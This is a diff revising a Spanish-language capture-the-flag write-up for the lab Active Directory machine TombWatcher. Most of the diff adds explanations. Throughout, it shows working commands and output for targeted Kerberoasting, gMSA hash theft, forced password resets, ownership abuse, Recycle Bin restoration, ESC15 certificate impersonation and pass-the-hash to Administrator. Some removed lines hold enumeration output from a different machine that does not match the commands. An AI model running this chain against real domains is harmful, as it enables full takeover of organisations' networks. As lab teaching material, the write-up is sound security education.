@@ -30,9 +30,6 @@ control total del dominio.
 
 ### Comprobación de conectividad
 
-Se enviará una solicitud de **ICMP** (`ping`) para comprobar que la máquina objetivo se
-encuentra activa y accesible.
-
 ```bash
 ping -c 1 10.129.232.167
 ```
@@ -42,9 +39,6 @@ ping -c 1 10.129.232.167
 ```
 
 ### Escaneo de Puertos
-
-Se ejecutará un escaneo de puertos con **Rustscan** para identificar los servicios expuestos
-en la máquina objetivo.
 
 ```bash
 rustscan -a $IP --ulimit 1000 -r 1-65535 -- -A -sC -sV -Pn -o nmapresult.txt
@@ -71,87 +65,73 @@ rustscan -a $IP --ulimit 1000 -r 1-65535 -- -A -sC -sV -Pn -o nmapresult.txt
 
 ### Análisis del escaneo
 
-Los puertos habituales de **Active Directory** se encuentran abiertos, incluyendo **DNS**,
-**Kerberos**, **LDAP**, **SMB** y **WinRM**, lo que confirma que el host corresponde a un
-**Controlador de Dominio** dentro del entorno `tombwatcher.htb`.
+Los puertos habituales de **Active Directory** confirman que el host es un **Controlador de Dominio** del entorno `tombwatcher.htb`.
 
-- **Firma SMB:** La firma obligatoria está habilitada, lo que descarta ataques de
-  retransmisión **NTLM**. Será necesario buscar otros vectores de ataque.
-- **ADCS detectado:** Los certificados SSL exponen la CA interna `tombwatcher-CA-1`,
-  lo que indica la presencia de **Active Directory Certificate Services**.
-- **WinRM habilitado:** El puerto `5985` está abierto, lo que permite acceso remoto con
-  credenciales válidas mediante **Windows Remote Management**.
-- **Desfase horario:** Se detectó una diferencia de 4 horas entre el servidor y nuestra
-  máquina. Este detalle es crítico para ataques **Kerberos**.
+**Observaciones clave:**
+
+- **ADCS detectado:** Los certificados SSL exponen la CA interna `tombwatcher-CA-1`, lo que indica la presencia de **Active Directory Certificate Services**. Esto es una señal temprana de que la ruta de escalada probablemente involucre abuso de templates de certificados.
+- **Firma SMB obligatoria:** Descarta ataques de relay NTLM como Responder + ntlmrelayx.
+- **WinRM en 5985:** Permite acceso remoto con credenciales válidas.
+- **Desfase horario:** Se detectó una diferencia de 4 horas. Crítico para Kerberos — sincronizar con `sudo ntpdate -u $IP` antes de cualquier ataque.
 
 ---
 
 ## Enumeración inicial (NXC)
 
-Reutilizaremos las credenciales filtradas por el creador para realizar una enumeración autenticada.
-
-### Enumeración de usuarios
-
 ```bash
 nxc smb $IP -u 'henry' -p 'H3nry_987TGV!' --users
-```
-
-```
-SMB   10.129.17.155  445  DC01  [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB   10.129.17.155  445  DC01  [+] fluffy.htb\p.agila:prometheusx-303
-SMB   10.129.17.155  445  DC01  -Username-          -Last PW Set-          -BadPW-  -Description-
-SMB   10.129.17.155  445  DC01  Administrator        2025-04-17 15:45:01 0           Built-in account for administering the computer/domain
-SMB   10.129.17.155  445  DC01  Guest                <never>             0           Built-in account for guest access to the computer/domain
-SMB   10.129.17.155  445  DC01  krbtgt               2025-04-17 16:00:02 0           Key Distribution Center Service Account
-SMB   10.129.17.155  445  DC01  ca_svc               2025-04-17 16:07:50 0
-SMB   10.129.17.155  445  DC01  ldap_svc             2025-04-17 16:17:00 0
-SMB   10.129.17.155  445  DC01  p.agila              2025-04-18 14:37:08 0
-SMB   10.129.17.155  445  DC01  winrm_svc            2025-05-18 00:51:16 0
-SMB   10.129.17.155  445  DC01  j.coffey             2025-04-19 12:09:55 0
-SMB   10.129.17.155  445  DC01  j.fleischman         2025-05-16 14:46:55 0
-SMB   10.129.17.155  445  DC01  [*] Enumerated 9 local users: FLUFFY
-```
-
-### Enumeración de recursos compartidos
-
-```bash
 nxc smb $IP -u 'henry' -p 'H3nry_987TGV!' --shares
 ```
 
-```
-SMB   10.129.17.155  445  DC01  [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB   10.129.17.155  445  DC01  [+] fluffy.htb\p.agila:prometheusx-303
-SMB   10.129.17.155  445  DC01  [*] Enumerated shares
-SMB   10.129.17.155  445  DC01  Share        Permissions   Remark
-SMB   10.129.17.155  445  DC01  -----        -----------   ------
-SMB   10.129.17.155  445  DC01  ADMIN$                     Remote Admin
-SMB   10.129.17.155  445  DC01  C$                         Default share
-SMB   10.129.17.155  445  DC01  IPC$         READ          Remote IPC
-SMB   10.129.17.155  445  DC01  IT           READ,WRITE
-SMB   10.129.17.155  445  DC01  NETLOGON     READ          Logon server share
-SMB   10.129.17.155  445  DC01  SYSVOL       READ          Logon server share
-```
-
-Los resultados muestran los recursos predeterminados de **Active Directory** (`ADMIN$`, `C$`,
-`IPC$`, `NETLOGON` y `SYSVOL`), sin recursos no estándar de interés inmediato.
+Los resultados muestran los recursos predeterminados de AD (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`) y los usuarios del dominio. Sin recursos no estándar de interés inmediato.
 
 ---
 
-## Análisis de Dominio - BloodHound
-
-Recopilamos información del dominio con las credenciales obtenidas para identificar
-rutas de ataque y escalada de privilegios.
+## Análisis de Dominio — BloodHound
 
 ```bash
 bloodhound-ce-python -u 'henry' -p 'H3nry_987TGV!' -d tombwatcher.htb -ns $IP -c All --zip
 ```
 
-### WriteSPN → Targeted Kerberoasting sobre Alfred
+BloodHound recopila todos los objetos del dominio y construye un grafo de relaciones que permite identificar la cadena completa de escalada antes de ejecutar un solo ataque.
 
-BloodHound revela que `henry` tiene el permiso `WriteSPN` sobre `alfred`, lo que le permite
-modificar el atributo **servicePrincipalName** y realizar **Targeted Kerberoasting**.
+---
+
+## WriteSPN — Targeted Kerberoasting sobre Alfred
+
+### ¿Qué es WriteSPN y por qué es peligroso?
+
+El atributo **servicePrincipalName (SPN)** de una cuenta de AD define los servicios Kerberos que esa cuenta representa. El KDC usa este atributo para saber qué clave usar al emitir un Ticket de Servicio (TGS): **cifra el TGS con el hash NTLM de la cuenta que tiene ese SPN registrado**.
+
+El permiso `WriteSPN` permite modificar este atributo en otro objeto. Esto habilita el **Targeted Kerberoasting**: asignar arbitrariamente un SPN a cualquier cuenta del dominio (aunque no sea una cuenta de servicio real), solicitar el TGS correspondiente, y crackear ese ticket offline para obtener la contraseña de esa cuenta.
+
+**¿Por qué es más peligroso que el Kerberoasting clásico?**
+
+El Kerberoasting clásico solo afecta a cuentas que ya tienen SPNs configurados (típicamente cuentas de servicio con contraseñas gestionadas por IT). El Targeted Kerberoasting puede apuntar a **cualquier cuenta de usuario**, incluyendo cuentas de usuario normal con contraseñas débiles que nunca fueron pensadas como objetivos de Kerberoasting.
+
+**Flujo del ataque:**
+
+```
+henry tiene WriteSPN sobre alfred
+    │
+    ▼
+henry asigna SPN falso a alfred
+    │
+    ▼
+KDC emite TGS cifrado con hash NTLM de alfred
+    │
+    ▼
+Crackeamos el TGS offline → contraseña de alfred
+    │
+    ▼
+henry elimina el SPN (limpieza)
+```
+
+BloodHound revela que `henry` tiene `WriteSPN` sobre `alfred`:
 
 ![WriteSPN](/assets/img/tombwatcher/writespn.png)
+
+La herramienta `targetedKerberoast` automatiza todo el proceso: asigna el SPN, solicita el TGS, lo exporta y limpia el SPN:
 
 ```bash
 targetedKerberoast -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --dc-host dc01.tombwatcher.htb
@@ -162,19 +142,17 @@ targetedKerberoast -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --dc-host dc01
 $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$f12e04dd...
 ```
 
-Crackeamos el hash offline con **Hashcat**:
-
 ```bash
 hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
 ```
 
-**Contraseña:** `basketball`
+**Contraseña obtenida:** `basketball`
 
 ---
 
-## AddSelf: Alfred → Infrastructure
+## AddSelf — Alfred hacia el grupo Infrastructure
 
-Verificamos si `alfred` tiene shell remota:
+### Verificación de acceso
 
 ```bash
 nxc winrm $IP -u 'alfred' -p 'basketball'
@@ -184,10 +162,13 @@ nxc winrm $IP -u 'alfred' -p 'basketball'
 [-] tombwatcher.htb\alfred:basketball
 ```
 
-Sin acceso directo por **WinRM**. BloodHound muestra que `alfred` tiene el permiso `AddSelf`
-sobre el grupo **Infrastructure**:
+`Alfred` no tiene acceso directo por WinRM. Necesitamos escalar sus permisos antes de poder usarlo para algo más. BloodHound muestra que `alfred` tiene `AddSelf` sobre el grupo **Infrastructure**:
 
 ![AddSelf](/assets/img/tombwatcher/addself.png)
+
+### ¿Qué ganamos uniéndonos a Infrastructure?
+
+Por sí solo, unirse a un grupo no tiene valor ofensivo inmediato. El valor está en los **permisos que ese grupo tiene sobre otros objetos**. BloodHound ya nos muestra que **Infrastructure** tiene `ReadGMSAPassword` sobre `ansible_dev$` — eso es lo que buscamos.
 
 ```bash
 bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb -u 'alfred' -p 'basketball' add groupMember 'INFRASTRUCTURE' 'alfred'
@@ -197,14 +178,17 @@ bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb -u 'alfred' 
 [+] alfred added to INFRASTRUCTURE
 ```
 
+> **Nota:** Los cambios de membresía de grupo en Kerberos no son inmediatos. El TGT actual de `alfred` no incluye el nuevo grupo hasta que se renueve. Si los ataques siguientes fallan con errores de permisos, obtener un TGT fresco con `kinit` o esperar a que expire el ticket actual.
+
 ---
 
-## ReadGMSAPassword: Infrastructure → ansible_dev$
+## ReadGMSAPassword — Infrastructure hacia ansible_dev$
 
-Una vez en el grupo **Infrastructure**, BloodHound revela que este grupo tiene el permiso
-`ReadGMSAPassword` sobre la cuenta `ansible_dev$`.
+### ¿Cómo funciona ReadGMSAPassword en este contexto?
 
-![ReadGMSA](/assets/img/tombwatcher/readgmsa.png)
+El atributo `msDS-GroupMSAMembership` de `ansible_dev$` contiene una ACL que lista qué principals pueden leer su contraseña. **Infrastructure** está en esa lista, y ahora `alfred` es miembro de **Infrastructure**, por lo que hereda ese permiso.
+
+La consulta se hace vía **LDAP** al atributo `msDS-ManagedPassword` de la cuenta gMSA. AD devuelve el blob de contraseña directamente. NXC extrae el hash NTLM de ese blob:
 
 ```bash
 nxc ldap $IP -u 'alfred' -p 'basketball' --gmsa
@@ -215,12 +199,23 @@ Account: ansible_dev$    NTLM: 7e792e4c14e4040a0b4f18235a6afe55
 PrincipalsAllowedToReadPassword: Infrastructure
 ```
 
+> Tenemos el hash NTLM de `ansible_dev$`. No necesitamos crackearlo — lo usaremos directamente como `-p ':7e792e4c14e4040a0b4f18235a6afe55'` en los siguientes pasos (Pass-the-Hash).
+
 ---
 
-## ForceChangePassword: ansible_dev$ → SAM
+## ForceChangePassword — ansible_dev$ hacia SAM
 
-BloodHound revela que `ansible_dev$` tiene el permiso `ForceChangePassword` sobre el
-usuario `SAM`.
+### ¿Qué es ForceChangePassword?
+
+`ForceChangePassword` es un permiso de ACL en AD que permite cambiar la contraseña de otra cuenta **sin conocer la contraseña actual**. Es diferente de un reset normal que requiere autenticación del propio usuario o privilegios de admin.
+
+**¿Cuándo aparece este permiso legítimamente?**
+
+En operaciones de helpdesk o scripts de automatización. Un bot de onboarding puede tener `ForceChangePassword` sobre cuentas nuevas para inicializarlas. El problema es cuando esa capacidad queda en manos de una cuenta comprometida.
+
+**Impacto ofensivo:** No hay forma para la víctima de detectar el cambio hasta que intente autenticarse y falle. No hay alerta de "contraseña cambiada" en la mayoría de configuraciones por defecto.
+
+BloodHound confirma que `ansible_dev$` tiene `ForceChangePassword` sobre `SAM`:
 
 ![ForceChangePassword](/assets/img/tombwatcher/forcechange.png)
 
@@ -234,26 +229,42 @@ bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb -u 'ansible_
 
 ---
 
-## WriteOwner: SAM → JOHN
+## WriteOwner — SAM hacia JOHN
 
-BloodHound muestra que `SAM` tiene el permiso `WriteOwner` sobre el usuario `john`.
+### ¿Qué es WriteOwner y por qué es tan poderoso?
+
+En Windows/AD, cada objeto tiene un **propietario** (Owner) almacenado en su descriptor de seguridad. El propietario de un objeto siempre tiene la capacidad implícita de **modificar las ACLs** de ese objeto, independientemente de los permisos explícitos configurados.
+
+`WriteOwner` permite cambiar quién es el propietario de un objeto. Si nos convertimos en propietario, podemos:
+1. Otorgarnos `GenericAll` sobre el objeto.
+2. Cambiar cualquier atributo, incluyendo la contraseña.
+
+**¿Por qué esta cadena de dos pasos?**
+
+`WriteOwner` por sí solo no da control directo. Primero hay que **usarlo para tomar propiedad**, y luego usar esa propiedad para **otorgarse permisos adicionales**. Es un patrón de dos pasos, pero el resultado final es control total.
+
+BloodHound muestra que `SAM` tiene `WriteOwner` sobre `john`:
 
 ![WriteOwner](/assets/img/tombwatcher/writeowner.png)
 
-### 1. Hacerse owner de JOHN
+### 1. Tomar propiedad de JOHN
 
 ```bash
-bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb -u 'SAM' -p 'Password!' set owner 'JOHN' 'sam'
+bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb \
+  -u 'SAM' -p 'Password!' set owner 'JOHN' 'sam'
 ```
 
 ```
 [+] Old owner is now replaced by sam on JOHN
 ```
 
-### 2. Agregar GenericAll sobre JOHN
+### 2. Otorgarse GenericAll sobre JOHN
+
+Ahora que `SAM` es propietario de `JOHN`, puede modificar sus ACLs para darse control total:
 
 ```bash
-bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb -u 'sam' -p 'Password!' add genericAll 'JOHN' 'sam'
+bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb \
+  -u 'sam' -p 'Password!' add genericAll 'JOHN' 'sam'
 ```
 
 ```
@@ -262,8 +273,11 @@ bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb -u 'sam' -p 
 
 ### 3. Cambiar contraseña de JOHN
 
+Con `GenericAll`, usamos `ForceChangePassword` implícito:
+
 ```bash
-bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb -u 'SAM' -p 'Password!' set password 'JOHN' 'Password!'
+bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb \
+  -u 'SAM' -p 'Password!' set password 'JOHN' 'Password!'
 ```
 
 ```
@@ -272,13 +286,11 @@ bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb -u 'SAM' -p 
 
 ---
 
-## Acceso Inicial: Evil-WinRM como john
+## Acceso Inicial — Evil-WinRM como john
 
 ```bash
 evil-winrm -i $IP -u 'john' -p 'Password!'
 ```
-
-### Flag de usuario
 
 ```powershell
 *Evil-WinRM* PS C:\Users\john> type Desktop\user.txt
@@ -287,35 +299,56 @@ evil-winrm -i $IP -u 'john' -p 'Password!'
 
 ---
 
-## Escalada de Privilegios
+## Escalada de Privilegios — AD Recycle Bin + ESC15
 
-El escaneo inicial detectó la CA interna `tombwatcher-CA-1`. Enumeramos los templates
-de certificado disponibles:
+### Enumeración ADCS
+
+El escaneo inicial detectó la CA `tombwatcher-CA-1`. Enumeramos los templates vulnerables:
 
 ```bash
 certipy find -u john -p 'Password!' -dc-ip $IP -enabled -stdout
 ```
 
-Se detecta el template **WebServer** con un **SID huérfano** en los permisos de enrolamiento:
-
 ```
-Enrollment Rights: TOMBWATCHER.HTB\Domain Admins
-                   TOMBWATCHER.HTB\Enterprise Admins
-                   S-1-5-21-1392491010-1358638721-2126982587-1111
+Template Name       : WebServer
+Schema Version      : 1
+Enrollment Rights:
+    TOMBWATCHER.HTB\Domain Admins
+    TOMBWATCHER.HTB\Enterprise Admins
+    S-1-5-21-1392491010-1358638721-2126982587-1111
 ```
 
 ![BloodHound ADCS](/assets/img/tombwatcher/acds.png)
 
-> Un **SID** que no resuelve a ningún nombre indica que la cuenta fue **eliminada**, pero
-> el **ACE** en el template sigue activo en AD. Si restauramos esa cuenta, recuperamos
-> automáticamente sus derechos de enrolamiento.
+El tercer entry en los derechos de enrolamiento es un **SID huérfano** — un identificador de seguridad que ya no resuelve a ningún nombre de objeto activo en el dominio. Esto es una señal inmediata de que la cuenta fue **eliminada**.
 
-### Identificar el objeto eliminado (AD Recycle Bin)
+**¿Por qué el ACE sigue activo si la cuenta fue eliminada?**
 
-Desde **Evil-WinRM** como `john`, buscamos el objeto por SID:
+AD almacena los ACEs como SIDs en el descriptor de seguridad del objeto. Cuando se elimina una cuenta, AD **no limpia automáticamente los ACEs** que hacen referencia a esa cuenta en otros objetos. El ACE queda huérfano. Si restauramos la cuenta (y su SID se preserva, lo que ocurre con AD Recycle Bin), los permisos se reactivan automáticamente.
+
+---
+
+## AD Recycle Bin — Restaurar cert_admin
+
+### ¿Qué es AD Recycle Bin?
+
+**AD Recycle Bin** es una funcionalidad de Active Directory (disponible desde Windows Server 2008 R2) que permite restaurar objetos eliminados **con todos sus atributos intactos**, incluyendo membresías de grupo, permisos y el SID original.
+
+**Sin AD Recycle Bin:** Cuando se elimina un objeto en AD, la mayoría de sus atributos son eliminados y el SID ya no puede ser reutilizado. La restauración es parcial y compleja.
+
+**Con AD Recycle Bin habilitado:** Los objetos eliminados se mueven a un contenedor especial `CN=Deleted Objects` y se conservan con todos sus atributos durante un período de tiempo (por defecto 180 días). La restauración es completa.
+
+**¿Por qué es relevante ofensivamente?**
+
+Si una cuenta con permisos privilegiados fue eliminada "accidentalmente" (o como medida de limpieza que no eliminó los ACEs referenciados), restaurarla reactiva todos esos permisos. Es exactamente lo que ocurre con `cert_admin` y el template **WebServer**.
+
+### Identificar el objeto por SID
+
+Desde Evil-WinRM como `john`, buscamos en los objetos eliminados por el SID huérfano:
 
 ```powershell
-Get-ADObject -Filter 'objectSid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"' -IncludeDeletedObjects -Properties *
+Get-ADObject -Filter 'objectSid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"' `
+  -IncludeDeletedObjects -Properties *
 ```
 
 ```
@@ -325,32 +358,40 @@ ObjectGUID     : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
 LastKnownParent: OU=ADCS,DC=tombwatcher,DC=htb
 ```
 
-### Restaurar cert_admin
+La cuenta `cert_admin` fue eliminada pero sigue en el contenedor de objetos eliminados con su SID original preservado.
+
+### Restaurar el objeto
 
 ```powershell
 Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
 ```
 
-### Obtener control sobre cert_admin
+Al restaurarse, `cert_admin` recupera automáticamente sus derechos de enrolamiento sobre el template **WebServer** porque el ACE con su SID ya estaba ahí — solo necesitaba que el SID volviera a resolver a una cuenta activa.
+
+### Tomar control de cert_admin
+
+Como `john`, nos otorgamos `GenericAll` sobre la cuenta recién restaurada:
 
 ```bash
-bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb -u 'john' -p 'Password!' add genericAll cert_admin john
+bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb \
+  -u 'john' -p 'Password!' add genericAll cert_admin john
 ```
 
 ```
 [+] john has now GenericAll on cert_admin
 ```
 
-### Habilitar y resetear contraseña de cert_admin
+### Habilitar y resetear contraseña
 
-Los objetos restaurados desde Recycle Bin vuelven **deshabilitados**:
+Los objetos restaurados desde Recycle Bin vuelven en estado **deshabilitado** por defecto. Hay que habilitarlos explícitamente:
 
 ```powershell
 Enable-ADAccount -Identity cert_admin
 ```
 
 ```bash
-bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb -u 'john' -p 'Password!' set password cert_admin 'Password!'
+bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb \
+  -u 'john' -p 'Password!' set password cert_admin 'Password!'
 ```
 
 ```
@@ -361,10 +402,51 @@ bloodyAD --host dc01.tombwatcher.htb --dc-ip $IP -d tombwatcher.htb -u 'john' -p
 
 ## ESC15 — CVE-2024-49019
 
-Confirmamos la vulnerabilidad con `cert_admin`:
+### ¿Qué es ESC15?
+
+**ESC15** es una vulnerabilidad en **Active Directory Certificate Services** descubierta en 2024. Afecta exclusivamente a templates de certificado con **Schema Version 1**, que es la versión original presente en AD desde Windows 2000.
+
+**¿Por qué Schema Version 1 es vulnerable?**
+
+Los templates de Schema Version 1 no tienen el atributo `msPKI-RA-Application-Policies`. Este atributo es el mecanismo que usan los templates modernos (versión 2+) para que la CA pueda **validar y restringir** qué Application Policies se incluyen en el certificado emitido.
+
+Sin este atributo, si el template tiene **"Enrollee Supplies Subject"** habilitado (el solicitante controla el contenido del CSR), el atacante puede incluir libremente cualquier Application Policy en su Certificate Signing Request, y la CA las acepta sin validación.
+
+**¿Qué son las Application Policies (Extended Key Usage)?**
+
+Las Application Policies (también llamadas Extended Key Usage) definen para qué puede usarse un certificado:
+- `1.3.6.1.5.5.7.3.2` → Client Authentication
+- `1.3.6.1.5.5.7.3.1` → Server Authentication
+- `1.3.6.1.4.1.311.20.2.1` → **Certificate Request Agent (Enrollment Agent)**
+
+El OID de **Enrollment Agent** es el crítico: permite usar el certificado para **solicitar certificados en nombre de otros usuarios**. Normalmente requiere un template especial y aprobación de administrador. Con ESC15, cualquier usuario con derechos de enrolamiento en un template Schema V1 puede auto-emitirse un certificado con este OID.
+
+**Flujo completo del ataque:**
+
+```
+cert_admin tiene derechos de enrolamiento en WebServer (Schema V1)
+    │
+    ▼
+Paso 1: Solicitar certificado con OID de Enrollment Agent inyectado
+        → La CA lo acepta sin validar (Schema V1 sin msPKI-RA-Application-Policies)
+        → Obtenemos cert_admin.pfx con capacidad de Enrollment Agent
+    │
+    ▼
+Paso 2: Usar cert_admin.pfx para solicitar certificado en nombre de Administrator
+        → La CA verifica que el solicitante tiene un certificado de Enrollment Agent válido
+        → Emite administrator.pfx con UPN = administrator@tombwatcher.htb
+    │
+    ▼
+Paso 3: Usar administrator.pfx para autenticarse vía PKINIT
+        → KDC verifica el certificado y emite un TGT para Administrator
+        → Obtenemos hash NT de Administrator vía UnPAC-the-Hash
+```
+
+### Confirmar la vulnerabilidad
 
 ```bash
-certipy find -u cert_admin@tombwatcher.htb -p 'Password!' -dc-host dc01.tombwatcher.htb -vulnerable -stdout
+certipy find -u cert_admin@tombwatcher.htb -p 'Password!' \
+  -dc-host dc01.tombwatcher.htb -vulnerable -stdout
 ```
 
 ```
@@ -375,12 +457,9 @@ Enrollee Supplies Subject: True
   ESC15: Enrollee supplies subject and schema version is 1.
 ```
 
-Los templates con **Schema Version 1** no tienen el atributo `msPKI-RA-Application-Policies`,
-por lo que la CA no puede restringir qué **Application Policies** se inyectan en el CSR.
-Esto permite agregar el OID de **Enrollment Agent** (`1.3.6.1.4.1.311.20.2.1`) y solicitar
-certificados en nombre de otros usuarios.
+### Paso 1 — Obtener certificado como Enrollment Agent
 
-### 1. Obtener certificado como Enrollment Agent
+Inyectamos el OID `1.3.6.1.4.1.311.20.2.1` en el CSR:
 
 ```bash
 certipy req -u cert_admin@tombwatcher.htb -p 'Password!' -dc-ip $IP -ca tombwatcher-CA-1 -template WebServer -application-policies '1.3.6.1.4.1.311.20.2.1'
@@ -391,7 +470,9 @@ certipy req -u cert_admin@tombwatcher.htb -p 'Password!' -dc-ip $IP -ca tombwatc
 [*] Saving certificate and private key to 'cert_admin.pfx'
 ```
 
-### 2. Impersonar Administrator
+### Paso 2 — Impersonar Administrator
+
+Usamos `cert_admin.pfx` (ahora con capacidad de Enrollment Agent) para solicitar un certificado en nombre del Administrator. La CA verifica que tenemos un Enrollment Agent válido y emite el certificado sin requerir intervención del Administrator:
 
 ```bash
 certipy req -u cert_admin@tombwatcher.htb -p 'Password!' -dc-ip $IP -ca tombwatcher-CA-1 -target dc01.tombwatcher.htb -template User -on-behalf-of 'tombwatcher\administrator' -pfx cert_admin.pfx
@@ -402,7 +483,11 @@ certipy req -u cert_admin@tombwatcher.htb -p 'Password!' -dc-ip $IP -ca tombwatc
 [*] Saving certificate and private key to 'administrator.pfx'
 ```
 
-### 3. Autenticarse con el certificado
+### Paso 3 — Autenticarse con PKINIT y extraer el hash NT
+
+**PKINIT** es una extensión de Kerberos que permite usar certificados X.509 en lugar de contraseñas para obtener TGTs. El KDC verifica la firma del certificado contra la CA del dominio y, si es válida, emite el TGT.
+
+**UnPAC-the-Hash** es una técnica adicional: durante la autenticación PKINIT, el KDC incluye el hash NT del usuario en una estructura cifrada del TGT (el PAC). Certipy puede extraer ese hash, lo que permite hacer Pass-the-Hash sin necesidad de crackear nada:
 
 ```bash
 certipy auth -pfx administrator.pfx -dc-ip $IP
@@ -417,11 +502,11 @@ certipy auth -pfx administrator.pfx -dc-ip $IP
 
 ## Acceso Final como Administrador
 
+Con el hash NT del Administrator usamos Pass-the-Hash directamente:
+
 ```bash
 evil-winrm -i $IP -u 'administrator' -H 'f61db423bebe3328d33af26741afe5fc'
 ```
-
-### Flag de root
 
 ```powershell
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
